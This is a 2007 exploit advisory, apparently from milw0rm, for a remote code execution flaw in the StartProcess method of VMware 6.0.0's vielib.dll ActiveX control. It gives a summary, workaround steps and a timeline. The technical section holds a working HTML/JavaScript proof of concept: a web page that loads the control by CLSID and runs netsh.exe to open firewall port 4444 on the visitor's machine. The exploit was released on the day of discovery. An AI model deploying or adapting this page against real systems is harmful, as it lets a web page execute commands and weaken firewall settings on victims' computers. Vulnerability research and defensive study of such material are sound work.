@@ -1,0 +1,78 @@
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+
+vielib.dll 2.2.5.42958 VmWare Inc version 6.0.0 Remode Code Execution Exploit
+=============================================================================
+
+Internal ID: VULWAR200707290.
+-----------
+
+Introduction
+------------
+vielib.dll is a library included in the Program Vmware Version 6.0.0 from Vmware Inc. Company.
+
+
+Tested In
+---------
+- Windows XP SP1/SP2 french/english with IE 6.0 / 7.0.
+
+
+Summary
+-------
+The StartProcess method doesn't check if it's being called from the application,
+or malicious users. Remote Attacker could craft a html page and execute code in
+a remote system with the actual user privileges.
+
+
+Impact
+------
+Any computer that uses this Sofware will be exposed to Remote Execution Code.
+
+
+Workaround
+----------
+- Activate the Kill bit zero in clsid:7B9C5422-39AA-4C21-BEEF-645E42EB4529
+- Unregister vielib.dll using regsvr32.
+
+
+Timeline
+--------
+July 29 2007 -- Bug Discovery.
+July 29 2007 -- Exploit published.
+
+
+Credits
+-------
+ * callAX <callAX@shellcode.com.ar>
+ * GoodFellas Security Research Team  <goodfellas.shellcode.com.ar>
+ 
+
+Technical Details
+-----------------
+
+StartProcess method needs three files (stdin, stdout, stderr) to success StartProcess. The exploit
+is using three standard files that exists in every Microsoft Office 2003 Application.
+
+
+<HTML>
+<BODY>
+  <object id=ctrl classid="clsid:{7B9C5422-39AA-4C21-BEEF-645E42EB4529}"></object>
+<SCRIPT>
+
+function Poc() {
+ arg1 = "C:\\windows\\system32\\netsh.exe"
+ arg2 = "C:\\windows\\system32\\netsh.exe firewall add portopening tcp 4444 GotIT"
+ arg3 = "C:\\windows\\system32\\"
+ arg4 = "C:\\Program Files\\Microsoft Office\\OFFICE11\\noiseneu.txt"
+ arg5 = "C:\\Program Files\\Microsoft Office\\OFFICE11\\noiseeng.txt"
+ arg6 = "C:\\Program Files\\Microsoft Office\\OFFICE11\\noiseenu.txt"
+ arg7 = "1"
+ ctrl.StartProcess(arg1 ,arg2 ,arg3 ,arg4 ,arg5 ,arg6 ,arg7)
+ }
+
+</SCRIPT>
+<input language=JavaScript onclick=Poc() type=button value="Proof of Concept">
+</BODY>
+</HTML>
+
+# milw0rm.com [2007-07-29]
